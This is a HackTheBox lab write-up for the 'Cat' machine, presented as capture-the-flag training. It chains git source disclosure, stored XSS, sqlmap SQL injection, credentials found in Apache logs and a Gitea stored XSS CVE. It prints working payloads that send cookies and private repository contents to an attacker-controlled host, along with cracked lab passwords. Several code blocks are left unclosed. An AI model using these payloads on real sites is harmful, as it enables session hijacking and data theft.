**Cat** is a Medium-rated box that may be challenging for those unfamiliar with web exploitation and code review. The main path involves a combination of XSS and SQL Injection to leak credentials. One of the leaked accounts grants access to the box. Further enumeration reveals a locally hosted Gitea instance that is vulnerable to stored XSS. By exploiting this, we can read a private repository containing root credentials.

Let’s dive in.

## Enumeration 

we will start with a port scan 

```bash
nmap -vv -sC -sV -oN nmap 10.10.11.53

# Nmap 7.95 scan initiated Sat Jul  5 14:30:00 2025 as: /usr/lib/nmap/nmap --privileged -vv -sC -sV -oN nmap 10.10.11.53

Like many HackTheBox machines, this one uses virtual host routing. The domain is `cat.htb`, so we add it to `/etc/hosts`:

in /etc/hosts
```bash
10.10.11.53 cat.htb
```

We only see two open ports, so let’s explore the HTTP service and run a background scan:

```bash
gobuster dir -u http://cat.htb -w /opt/SecLists-master/Discovery/Web-Content/raft-small-words.txt

We find a `.git` folder—a strong indicator of source code disclosure. We dump the repo:
Tip: running nmap with the domain name and default scripts will enumerate for .git be default we ran nmap with the ip that's why we didn't find it

we will use git-dumper

```bash
git-dumper http://cat.htb/.git .
```
![](/assets/posts/Cat/Cat,.png)
## Web
we could see the source code of the application  

before looking into admin.php let's try to find a way to get to admin  
![](/assets/posts/Cat/Cat,-1.png)
we could see that the email and username aren't sanitized before getting stored in the database the first thing to look at where are those values getting reflected to see if there are still unsatisfied before rendering   
![](/assets/posts/Cat/Cat,-2.png)
when registering a cat the username get's stored in the cats table under owner_username 

at the end we will find that this information is displayed from the users table not from the cats table in both cases in will be vulnerable because contains_forbidden_content function doesn't include owner_username 

```sql
$query = "SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id";
```
that's the query used and then it reflects the username
![](/assets/posts/Cat/Cat,-3.png)
now what do we do 

Register with a username that would steal the cookie -> register a cat in the contest field -> and hope that admin view cats information so that this XSS run 

```bash
<script>fetch("http://10.10.16.20:8000/w?cookie=" + encodeURIComponent(document.cookie))</script>
```


![](/assets/posts/Cat/Cat,-6.png)
![](/assets/posts/Cat/Cat,-5.png)
![](/assets/posts/Cat/Cat,-7.png)
now we have the admin cookie we could log in as admin 

let's go back to the admin.php file and look more into it nothing much we could look for some we won't find much but in the accept_cat.php we will find sql injection in the catName parameter

![](/assets/posts/Cat/Cat,-8.png)

I will just use sqlmap to try and dump the database 

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --data="catId=1&catName=test" --cookie="PHPSESSID=p1pmjehcou73j505ol3te06gc1" -p catName --level 5 --risk 3 --batch --dbs

coudn't crack axels password but rosa password is crackable  

*rosa:soyunaprincesarosa*

## User

![](/assets/posts/Cat/Cat,-10.png)

rosa is in the admin group what could this group grant us 
![](/assets/posts/Cat/Cat,-11.png)
why have access to logs

the next part isn't very easy to spot and may require some guessing but we will find axels credentials in plan text in logs

```bash
cat /var/log/apache2/access.log | grep -i pass
```

![](/assets/posts/Cat/Cat,-12.png)
maybe not much guessing was needed after all

now we could login as axel

*axel:aNdZwgC4tI9gnVXv_e3Q*

![](/assets/posts/Cat/Cat,-13.png)

## root

why could see that axel has mail

![](/assets/posts/Cat/Cat,-14.png)

I will forward the port with 

```bash
~C
-L 3000:localhost:3000
```

it's a gittea version 1.22.0


```txt
# Exploit Title: Stored XSS in Gitea
# Date: 27/08/2024
# Exploit Authors: Catalin Iovita & Alexandru Postolache
# Vendor Homepage: (https://github.com/go-gitea/gitea)
# Version: 1.22.0
# Tested on: Linux 5.15.0-107, Go 1.23.0
# CVE: CVE-2024-6886

## Vulnerability Description
Gitea 1.22.0 is vulnerable to a Stored Cross-Site Scripting (XSS) vulnerability. This vulnerability allows an attacker to inject malicious scripts that get stored on the server and executed in the context of another user's session.

## Steps to Reproduce
1. Log in to the application.
2. Create a new repository or modify an existing repository by clicking the Settings button from the `$username/$repo_name/settings` endpoint.
3. In the Description field, input the following payload:

    <a href=javascript:alert()>XSS test</a>

4. Save the changes.
5. Upon clicking the repository description, the payload was successfully injected in the Description field. By clicking on the message, an alert box will appear, indicating the execution of the injected script.
```

this version is vulnerable to xss
I will input this into the description 

```bash
<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md').then(response => response.text()).then(data => fetch('http://10.10.16.20:8000/?code=' + encodeURIComponent(data)));">XSS</a> 
```

and we could send the mail with this command

```bash
echo -e "http://localhost:3000/axel/XSS" | sendmail jobert@cat.htb
``` 

README.md didn't worke for me so I did try and fetch index.php instead and I got this
